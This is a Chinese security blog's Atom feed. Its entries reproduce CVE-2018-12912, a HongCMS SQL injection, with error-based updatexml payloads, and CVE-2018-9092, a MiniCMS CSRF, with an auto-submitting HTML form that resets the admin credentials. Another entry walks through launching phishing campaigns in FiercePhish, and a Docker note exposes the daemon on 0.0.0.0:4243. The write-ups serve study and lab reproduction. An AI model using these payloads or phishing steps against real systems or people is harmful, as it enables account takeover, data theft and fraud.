<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>XTTF的小屋</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-07-09T06:14:04.445Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>XTTF</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>19年上半年总结</title>
    <link href="http://yoursite.com/2019/07/09/19%E5%B9%B4%E4%B8%8A%E5%8D%8A%E5%B9%B4%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/07/09/19年上半年总结/</id>
    <published>2019-07-09T04:00:29.000Z</published>
    <updated>2019-07-09T06:14:04.445Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>总结下我19年这半年的所作所为</p><h4 id="0x00-毕业设计"><a href="#0x00-毕业设计" class="headerlink" title="0x00  毕业设计"></a>0x00  毕业设计</h4><p>没错，这段时间正值我大四写论文的时间，这件事情持续时间跨度达半年时间，期间我在我指导老师的帮助下完成了毕业答辩，同时也为自己的大学生涯画上句号。至于毕业设计做了什么，答案是我为我们社团的学弟学妹（貌似没有学妹，哭唧唧）做了一个CTF的系统。</p><h4 id="0x01-关于实习"><a href="#0x01-关于实习" class="headerlink" title="0x01 关于实习"></a>0x01 关于实习</h4><p>今年3月份开始在安恒信息实习，认识了许多大佬同时也学到了很多东西，最后因为很多原因没能继续在安恒工作和学习</p><h4 id="0x02-关于计划"><a href="#0x02-关于计划" class="headerlink" title="0x02 关于计划"></a>0x02 关于计划</h4><p>1.继续在Web安全的海洋中飘荡</p><p>2.重新学一遍PHP和Python</p><p>3.学学内网</p><p>4.接着在Hackerone挖漏洞，毕竟比国内挣钱多了</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="总结" scheme="http://yoursite.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="学习" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>HongCMS 3.0.0 SQL注入漏洞</title>
    <link href="http://yoursite.com/2018/08/30/HongCMS%203.0.0%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/08/30/HongCMS 3.0.0 SQL注入漏洞/</id>
    <published>2018-08-30T07:00:36.000Z</published>
    <updated>2018-08-30T07:01:46.511Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h4 id="CVE-2018-12912-HongCMS-3-0-0-SQL注入漏洞"><a href="#CVE-2018-12912-HongCMS-3-0-0-SQL注入漏洞" class="headerlink" title="CVE-2018-12912-HongCMS 3.0.0 SQL注入漏洞"></a>CVE-2018-12912-HongCMS 3.0.0 SQL注入漏洞</h4><h5 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h5><p>就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 </p><p>具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p><h5 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h5><p>根据exploit-db给出的exp进行分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/admin/index.php/database/operate?dbaction=emptytable&amp;tablename=hong_vvc%60%20where%20vvcid%3D1%20or%20updatexml%282%2Cconcat%280x7e%2C%28version%28%29%29%29%2C0%29%20or%20%60</div></pre></td></tr></table></figure><p>根据exp地址是/admin/index.php/database目录下，所以我们使用phpstorm打开，使用全局搜索查找operate参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">public function index()&#123;</div><div class="line">$this-&gt;PrintInstructions();</div><div class="line"></div><div class="line">echo &apos;&lt;form method=&quot;post&quot; action=&quot;&apos;.BURL(&apos;database/operate&apos;).&apos;&quot; name=&quot;tables&quot;&gt;</div><div class="line">&lt;input type=&quot;hidden&quot; name=&quot;dbaction&quot; value=&quot;&quot;&gt;&apos;;</div><div class="line"></div><div class="line">TableHeader(&apos;数据库列表&apos;);</div><div class="line">TableRow(array(&apos;选择&apos;, &apos;表名称&apos;, &apos;记录数&apos;, &apos;数据大小&apos;, &apos;索引大小&apos;, &apos;空闲&apos;, &apos;操作&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;), &apos;tr0&apos;);</div><div class="line"></div><div class="line">$recordsize = $datasize = $indexsize = $freesize = 0;</div><div class="line">.....</div></pre></td></tr></table></figure><p>这里的BURL(‘database/operate’)和我们的exp的url的参数相似，所以我们跟进BURL()函数，发现是对url进行伪静态处理。</p><p>接下来我们对dbaction参数进行分析，老样子进行全局搜索，发现出现在这最多</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">while($tableinfo = $this-&gt;db-&gt;fetch($gettables))&#123;</div><div class="line">TableRow(array(&apos;&lt;input type=&quot;checkbox&quot; name=&quot;tablenames[]&quot; value=&quot;&apos; . $tableinfo[&apos;Name&apos;] . &apos;&quot;&gt;&apos;, </div><div class="line">$tableinfo[&apos;Name&apos;], </div><div class="line">$tableinfo[&apos;Rows&apos;], </div><div class="line">DisplayFilesize($tableinfo[&apos;Data_length&apos;]), </div><div class="line">DisplayFilesize($tableinfo[&apos;Index_length&apos;]), </div><div class="line">Iif($tableinfo[&apos;Data_free&apos;] &gt; 0, &apos;&lt;b&gt;&apos; . DisplayFilesize($tableinfo[&apos;Data_free&apos;]) . &apos;&lt;/b&gt;&apos;, 0), </div><div class="line">&apos;&lt;a href=&quot;&apos;.BURL(&apos;database/operate?dbaction=checktable&amp;tablename=&apos; . $tableinfo[&apos;Name&apos;]) . &apos;&quot;&gt;查错&lt;/a&gt;&apos;, </div><div class="line">&apos;&lt;a href=&quot;&apos;.BURL(&apos;database/operate?dbaction=optimizetable&amp;tablename=&apos; . $tableinfo[&apos;Name&apos;]) . &apos;&quot;&gt;优化&lt;/a&gt;&apos;, </div><div class="line">&apos;&lt;a href=&quot;&apos;.BURL(&apos;database/operate?dbaction=repairtable&amp;tablename=&apos; . $tableinfo[&apos;Name&apos;]) . &apos;&quot;&gt;修复&lt;/a&gt;&apos;, </div><div class="line">&apos;&lt;a href=&quot;&apos;.BURL(&apos;database/operate?dbaction=backuptable&amp;tablename=&apos; . $tableinfo[&apos;Name&apos;]) . &apos;&quot;&gt;备份&lt;/a&gt;&apos;, </div><div class="line">Iif($tableinfo[&apos;Name&apos;] == TABLE_PREFIX . &apos;sessions&apos; OR $tableinfo[&apos;Name&apos;] == TABLE_PREFIX . &apos;vvc&apos;, &apos;&lt;a href=&quot;#&quot; onclick=&quot;&apos;.Confirm(&apos;确定清空此数据库表 &apos; . $tableinfo[&apos;Name&apos;] . &apos; 吗?&apos;, &apos;database/operate?dbaction=emptytable&amp;tablename=&apos; . $tableinfo[&apos;Name&apos;]).&apos;&quot;&gt;清空&lt;/a&gt;&apos;)));</div></pre></td></tr></table></figure><p>TABLE_PREFIX . ‘vvc’ 这个就是exp中的hong_vvc，由于满足条件所以执行到下面的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">public function operate()&#123;</div><div class="line">$action = ForceStringFrom(&apos;dbaction&apos;);</div><div class="line">$tablename = ForceStringFrom(&apos;tablename&apos;);</div><div class="line"></div><div class="line">switch ($action)&#123;</div><div class="line">case &apos;checktable&apos;:</div><div class="line">$this-&gt;PrintResults(&apos;数据库表查错&apos;, $this-&gt;TableOperation($tablename, &apos;CHECK&apos;));</div><div class="line">break;</div><div class="line">......</div><div class="line">case &apos;emptytable&apos;:</div><div class="line">$this-&gt;PrintResults(&apos;数据库表清空&apos;, $this-&gt;EmptyTable($tablename));</div><div class="line">break;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>当case = emptytable时，执行了$this-&gt;EmptyTable($tablename)，我们分析下EmptyTable方法的内容，发现使用了``，所以可以使用url编码进行绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">private function EmptyTable($tablename)&#123;</div><div class="line">$this-&gt;db-&gt;exe(&quot;DELETE FROM `$tablename`&quot;);</div><div class="line">$msg = &apos;已完成清空数据库表: &apos; . $tablename . &apos;&lt;br/&gt;&apos;;</div><div class="line"></div><div class="line">return $msg;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h5 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h5><p>HongCMS下载地址<a href="https://github.com/Neeke/HongCMS/" target="_blank" rel="external">https://github.com/Neeke/HongCMS/</a></p><p>按照github作者的安装方法安装HongCMS系统</p><p>安装完成进入管理员后台，找到数据库维护页面</p><p><img src="https://s1.ax1x.com/2018/08/30/PjSH1O.png" alt=""></p><p>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/admin/index.php/database/operate?dbaction=emptytable&amp;tablename=hong_vvc%60%20where%20vvcid%3D1%20or%20updatexml%282%2Cconcat%280x7e%2C%28version%28%29%29%29%2C0%29%20or%20%60</div></pre></td></tr></table></figure><p>解码得</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/admin/index.php/database/operate?dbaction=emptytable&amp;tablename=hong_vvc` where vvcid=1 or updatexml(2，concat(0x7e，(version()))，0) or `</div></pre></td></tr></table></figure><p>所以我们可以查看数据库的版本号</p><p><img src="https://s1.ax1x.com/2018/08/30/PjSbcD.png" alt=""></p><p>或者查询下当前数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/admin/index.php/database/operate?dbaction=emptytable&amp;tablename=hong_vvc%60%20where%20vvcid%3D1%20or%20updatexml%282%2Cconcat%280x7e%2C%28database%28%29%29%29%2C0%29%20or%20%60</div></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/08/30/PjS79K.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="CVE复现" scheme="http://yoursite.com/categories/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入漏洞</title>
    <link href="http://yoursite.com/2018/08/30/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/08/30/SQL注入漏洞/</id>
    <published>2018-08-30T05:53:57.000Z</published>
    <updated>2018-08-30T05:53:57.695Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2018-9092-MiniCMS 1.10跨站请求伪造漏洞</title>
    <link href="http://yoursite.com/2018/08/24/MiniCMS%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2018/08/24/MiniCMS复现/</id>
    <published>2018-08-24T05:39:36.000Z</published>
    <updated>2018-08-24T05:47:30.847Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h3 id="CVE-2018-9092-MiniCMS-1-10跨站请求伪造漏洞"><a href="#CVE-2018-9092-MiniCMS-1-10跨站请求伪造漏洞" class="headerlink" title="CVE-2018-9092-MiniCMS 1.10跨站请求伪造漏洞"></a>CVE-2018-9092-MiniCMS 1.10跨站请求伪造漏洞</h3><p><strong>跨站请求伪造（CSRF）</strong></p><p>​    被称为 <strong>one-click attack</strong> 或者 <strong>session riding</strong>，通常缩写为 <strong>CSRF</strong> 或者 <strong>XSRF</strong>， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本(XSS)相比，<strong>XSS</strong> 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。 </p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>文件在\MiniCMS\mc-admin\conf.php存在CSRF漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$display_info = false;</div><div class="line">  </div><div class="line">if (isset($_POST[&apos;save&apos;])) &#123;</div><div class="line">  $user_name_changed = $_POST[&apos;user_name&apos;] != $mc_config[&apos;user_name&apos;];</div><div class="line">  </div><div class="line">  $mc_config[&apos;site_name&apos;] = $_POST[&apos;site_name&apos;];</div><div class="line">  $mc_config[&apos;site_desc&apos;] = $_POST[&apos;site_desc&apos;];</div><div class="line">  $mc_config[&apos;site_link&apos;] = $_POST[&apos;site_link&apos;];</div><div class="line">  $mc_config[&apos;user_nick&apos;] = $_POST[&apos;user_nick&apos;];</div><div class="line">  $mc_config[&apos;user_name&apos;] = $_POST[&apos;user_name&apos;];</div><div class="line">  $mc_config[&apos;comment_code&apos;] = get_magic_quotes_gpc() ? stripslashes(trim($_POST[&apos;comment_code&apos;])) : trim($_POST[&apos;comment_code&apos;]);</div><div class="line">  </div><div class="line">  if ($_POST[&apos;user_pass&apos;] != &apos;&apos;)</div><div class="line">    $mc_config[&apos;user_pass&apos;] = $_POST[&apos;user_pass&apos;];</div><div class="line"></div><div class="line">  $code = &quot;&lt;?php\n\$mc_config = &quot;.var_export($mc_config, true).&quot;\n?&gt;&quot;;</div><div class="line">  </div><div class="line">  file_put_contents(&apos;../mc-files/mc-conf.php&apos;, $code);</div><div class="line">  </div><div class="line">  if ($_POST[&apos;user_pass&apos;] != &apos;&apos; || $user_name_changed) &#123;</div><div class="line">    setcookie(&apos;mc_token&apos;, md5($mc_config[&apos;user_name&apos;].&apos;_&apos;.$mc_config[&apos;user_pass&apos;]));</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  $display_info = true;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$site_name = $mc_config[&apos;site_name&apos;];</div><div class="line">$site_desc = $mc_config[&apos;site_desc&apos;];</div><div class="line">$site_link = $mc_config[&apos;site_link&apos;];</div><div class="line">$user_nick = $mc_config[&apos;user_nick&apos;];</div><div class="line">$user_name = $mc_config[&apos;user_name&apos;];</div><div class="line">$comment_code = isset($mc_config[&apos;comment_code&apos;]) ? $mc_config[&apos;comment_code&apos;] : &apos;&apos;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>问题点如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">if ($_POST[&apos;user_pass&apos;] != &apos;&apos; || $user_name_changed) &#123;</div><div class="line">  setcookie(&apos;mc_token&apos;, md5($mc_config[&apos;user_name&apos;].&apos;_&apos;.$mc_config[&apos;user_pass&apos;]));</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>管理员在修改后台设置的时候，token只验证了登陆后的用户名和密码的md5，所以只要构造一个html页面即可重置管理员的密码</p><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>我在dockerhub上传了漏洞docker镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker pull gfattf1/minicms-1.10</div></pre></td></tr></table></figure><p>漏洞点</p><p><img src="https://s1.ax1x.com/2018/08/24/P7O9Gq.png" alt=""></p><p>这里我们的用户名是admin密码是123456</p><p>构造exp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=GB2312"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.72.128:8989/MiniCMS/mc-admin/conf.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"site_name"</span> <span class="attr">value</span>=<span class="string">"hack123"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"site_desc"</span> <span class="attr">value</span>=<span class="string">"hacktest"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"site_link"</span> <span class="attr">value</span>=<span class="string">"http://192.168.72.128:8989/MiniCMS"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user_nick"</span> <span class="attr">value</span>=<span class="string">"hack"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user_name"</span> <span class="attr">value</span>=<span class="string">"root"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user_pass"</span> <span class="attr">value</span>=<span class="string">"root"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"comment_code"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"save"</span> <span class="attr">value</span>=<span class="string">" "</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line">    document.forms[0].submit();</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure><p>只要构造如上的exp去欺骗网站管理员去访问，即可修改网站后台的网站设置</p><p><img src="https://s1.ax1x.com/2018/08/24/P7OFMT.png" alt=""></p><p>可以看到站点设置里的内容已经被修改</p><p>这里使用原密码登陆后台，发现已经无法进入后台设置，且在返回包中未发现mc_taken值</p><p><img src="https://s1.ax1x.com/2018/08/24/P7Lxaj.png" alt=""></p><p><img src="https://s1.ax1x.com/2018/08/24/P7OCR0.png" alt=""></p><p>现在使用修改后的用户名root和密码root进行登陆，发现登陆成功，返回包中包含mc_taken值</p><p><img src="https://s1.ax1x.com/2018/08/24/P7Opin.png" alt=""></p><p><img src="https://s1.ax1x.com/2018/08/24/P7OPzV.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="CVE复现" scheme="http://yoursite.com/categories/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>FiercePhish的简单使用</title>
    <link href="http://yoursite.com/2018/07/30/FiercePhish%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2018/07/30/FiercePhish的简单使用/</id>
    <published>2018-07-30T06:43:26.000Z</published>
    <updated>2018-07-30T07:14:55.983Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h3 id="FiercePhish"><a href="#FiercePhish" class="headerlink" title="FiercePhish"></a><strong>FiercePhish</strong></h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>官方wiki <a href="https://github.com/Raikia/FiercePhish/wiki/Setup-Guide" target="_blank" rel="external">https://github.com/Raikia/FiercePhish/wiki/Setup-Guide</a></p><p>安装使用官方推荐的自动安装步骤，但是因为服务器在国外的原因，安装过程会十分的慢，所以推荐使用全局代理的模式进行下载安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">官方推荐使用ubuntu16.04和ubuntu16.10这两个Linux发行版</div><div class="line"></div><div class="line">安装步骤</div><div class="line">1.切换到root下  su root</div><div class="line">2.生成配置文件 curl https://raw.githubusercontent.com/Raikia/FiercePhish/master/install.sh |       bash</div><div class="line">3.运行后，会在“〜/ FiercePhish.config”的配置文件，修改CONFIGURED = true后</div><div class="line">4.重新运行curl https://raw.githubusercontent.com/Raikia/FiercePhish/master/install.sh | bash</div><div class="line">5.等待安装结束，在使用代理下大约半个小时可以安装完成</div></pre></td></tr></table></figure><h4 id="配置框架"><a href="#配置框架" class="headerlink" title="配置框架"></a>配置框架</h4><p>打开Settings 标签卡的Configuration 选项，修改下图框中的选项，修改时区为Asia/Shanghai，配置邮件服务器，分别为Mailgun和SMTP两种方式，之后点击保存设置</p><p><img src="http://owq08tgs4.bkt.clouddn.com/%E9%92%93%E9%B1%BC9.png" alt=""></p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><h5 id="添加钓鱼邮件模板"><a href="#添加钓鱼邮件模板" class="headerlink" title="添加钓鱼邮件模板"></a>添加钓鱼邮件模板</h5><p>在 Emails 这个选项卡中选择Email Templates选项点击下方的Create New Template，去添加一个新的模板</p><p><img src="http://owq08tgs4.bkt.clouddn.com/%E9%92%93%E9%B1%BC1.png" alt=""></p><p>在弹出的界面中，为模板起个名字</p><p><img src="http://owq08tgs4.bkt.clouddn.com/%E9%92%93%E9%B1%BC2.png" alt=""></p><p>现在可以根据需求添加一个自己的模板</p><p><img src="http://owq08tgs4.bkt.clouddn.com/%E9%92%93%E9%B1%BC3.png" alt=""></p><p>修改完成后在下方可以预览自己的模板，点击Save Template保存模板</p><p><img src="http://owq08tgs4.bkt.clouddn.com/%E9%92%93%E9%B1%BC4.png" alt=""></p><h5 id="添加一个目标邮件"><a href="#添加一个目标邮件" class="headerlink" title="添加一个目标邮件"></a>添加一个目标邮件</h5><p>打开Targets标签卡，选择All Targets ，一共有两种方法，第一种是添加单个邮箱，第二种是批量导入邮箱，添加成功就会在上方显示出来</p><p><img src="http://owq08tgs4.bkt.clouddn.com/%E9%92%93%E9%B1%BC5.png" alt=""></p><h5 id="添加一个欺骗列表"><a href="#添加一个欺骗列表" class="headerlink" title="添加一个欺骗列表"></a>添加一个欺骗列表</h5><p>打开Targets标签卡，选择All Lists，在下方 Add a List 添加一个欺骗列表，添加一个名字，点击Create List</p><p><img src="http://owq08tgs4.bkt.clouddn.com/%E9%92%93%E9%B1%BC6.png" alt=""></p><p>点击跳转到详细编辑目录，点击Add individual users to List 添加邮箱列表</p><p><img src="http://owq08tgs4.bkt.clouddn.com/%E9%92%93%E9%B1%BC7.png" alt=""></p><p>首先点击上面的邮箱栏，使其从白变为红色，在左下栏会显示从上面接收到的邮箱，最后点击Edit List保存</p><p><img src="http://owq08tgs4.bkt.clouddn.com/%E9%92%93%E9%B1%BC8.png" alt=""></p><h5 id="发起一个欺骗"><a href="#发起一个欺骗" class="headerlink" title="发起一个欺骗"></a>发起一个欺骗</h5><p><img src="http://owq08tgs4.bkt.clouddn.com/%E9%92%93%E9%B1%BC10.png" alt=""></p><p>Campaign Name和 Campaign Description根据自己需求自行填写</p><p>Email Template选择我们刚才创建的模板</p><p>Sender Name 填写发件人名字 </p><p>Sender Email 发件人邮箱</p><p>Sending Schedule  发送邮件的模式，分为发送一次和添加时间和次数</p><p>然后点击Launch Campaign! 完成</p><p><img src="http://owq08tgs4.bkt.clouddn.com/%E9%92%93%E9%B1%BC11.png" alt=""></p><p>发现我们已经成功发出了钓鱼邮件</p><h4 id="攻击例子"><a href="#攻击例子" class="headerlink" title="攻击例子"></a>攻击例子</h4><p>根据以上步骤，我们可以成功的去发送一封钓鱼邮件，下面是我在实验中测试发送的邮件</p><p><img src="http://owq08tgs4.bkt.clouddn.com/%E9%92%93%E9%B1%BC13.png" alt=""></p><p><img src="http://owq08tgs4.bkt.clouddn.com/%E9%92%93%E9%B1%BC12.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="好玩的" scheme="http://yoursite.com/categories/%E5%A5%BD%E7%8E%A9%E7%9A%84/"/>
    
    
      <category term="学习" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Docker错误问题（未完）</title>
    <link href="http://yoursite.com/2018/07/23/docker%E9%97%AE%E9%A2%98/"/>
    <id>http://yoursite.com/2018/07/23/docker问题/</id>
    <published>2018-07-23T04:00:29.000Z</published>
    <updated>2018-08-23T06:27:16.815Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h4 id="使用docker问题"><a href="#使用docker问题" class="headerlink" title="使用docker问题"></a>使用docker问题</h4><p>问题一</p><p>使用docker-compose up 报 这个坑爹的错误，分分钟想砸键盘的！！！！！！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Couldn&apos;t connect to Docker daemon at http://localhost:4243 - is it running?</div><div class="line"></div><div class="line">If it&apos;s at a non-standard location, specify the URL with the DOCKER_HOST environment variable.</div></pre></td></tr></table></figure><p>解决办法</p><p>第一步</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">export DOCKER_HOST=tcp://localhost:4243</div></pre></td></tr></table></figure><p>第二步<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo vim /lib/systemd/system/docker.service</div><div class="line">ExecStart=/usr/bin/dockerd -H unix:///var/run/docker.sock -H tcp://0.0.0.0:4243 #注意这里的0.0.0.0根据自己的需求配置是否只需要配置本地</div></pre></td></tr></table></figure></p><p>第三步<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo vim  /etc/default/docker</div><div class="line">DOCKER_OPTS=&quot;-H tcp://localhost:4243 -H unix:///var/run/docker.sock&quot; #DOCKER_OPTS的设置</div></pre></td></tr></table></figure></p><p>最后一步<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo systemctl daemon-reload</div><div class="line">sudo systemctl restart docker</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Docker" scheme="http://yoursite.com/categories/Docker/"/>
    
    
      <category term="学习" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>webhacking三题</title>
    <link href="http://yoursite.com/2018/07/20/webhacking/"/>
    <id>http://yoursite.com/2018/07/20/webhacking/</id>
    <published>2018-07-20T03:30:00.000Z</published>
    <updated>2018-08-22T14:44:01.797Z</updated>
    
